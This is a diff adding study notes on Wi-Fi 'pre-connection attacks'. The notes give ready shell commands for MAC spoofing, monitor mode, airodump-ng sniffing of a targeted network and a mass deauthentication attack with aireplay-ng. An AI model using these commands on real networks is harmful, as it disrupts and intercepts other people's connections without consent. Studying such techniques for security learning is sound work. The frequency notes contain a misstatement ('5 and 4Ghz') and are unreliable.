@@ -1,0 +1,34 @@
+Section 1: Pre-connection attacks.
+  # How to change MAC address
+    >> ifconfig wlan0 down
+    >> ifconfig wlan0 hw ether 00:11:22:33:44:55
+    >> ifconfig wlan0 up
+
+  # How to change wireless Managed mode to Monitor mode
+    >> ifconfig wlan0 down
+    >> airmon-ng check kill
+    >> iwconfig wlan0 mode monitor
+    >> ifconfig wlan0 up
+    
+  # Packet Sniffing Basics
+    Case 1: 2.4GHz
+    >> airodump-ng mon0 (2.4Ghz only)
+    Case 2: 5Ghz or 2.4Ghz
+    >> airodump-ng --band a mon0 (5Ghz only)
+    >> airodump-ng --band abg mon0 (2.4 and 5Ghz)
+    
+    ---OPTION:
+       a: uses 5Ghz only
+       b,g: both use 2.4Ghz only
+       n: uses 5 and 4Ghz
+       ac: uses frequencies lower than 6Ghz
+       
+  # Targeted Packet Sniffing
+    Step 1: show tagert information
+    >> airodump-ng --bssid [BSSID] --channel [CH] --write test mon0 (Show only one target BSSID)
+    Step 2: open wireshark & import *.cap file
+    >> wireshark
+     
+  # Deauthentication Attack (Disconnecting Any Device From The Network)
+    * Work on encrypted network WEP, WPA, WPA2
+    >> aireplay-ng --deauth 10000000 -a [BSSID] -c [STATION] mon0
